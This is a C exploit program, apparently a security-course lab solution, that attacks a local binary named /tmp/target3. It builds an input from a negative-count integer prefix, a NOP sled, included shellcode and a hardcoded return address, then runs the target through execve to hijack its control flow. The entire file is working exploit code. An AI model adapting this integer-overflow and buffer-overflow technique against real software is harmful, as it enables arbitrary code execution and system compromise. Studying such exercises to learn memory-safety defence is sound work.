#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buffer[3219]; // 11 + 16 * MAX_WIDGETS + 8
  
  memset(buffer, 0x90, 3219);
  memcpy(buffer, "2147483849,", 11); // binary value of 201, with the most significant bit as 1
  memcpy(buffer + 3000, shellcode, 45);
  memcpy(buffer + 3215, "\x58\xe5\xff\xbf", 4); // 11 + 16 * MAX_WIDGETS + 4, beginning of the nops

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
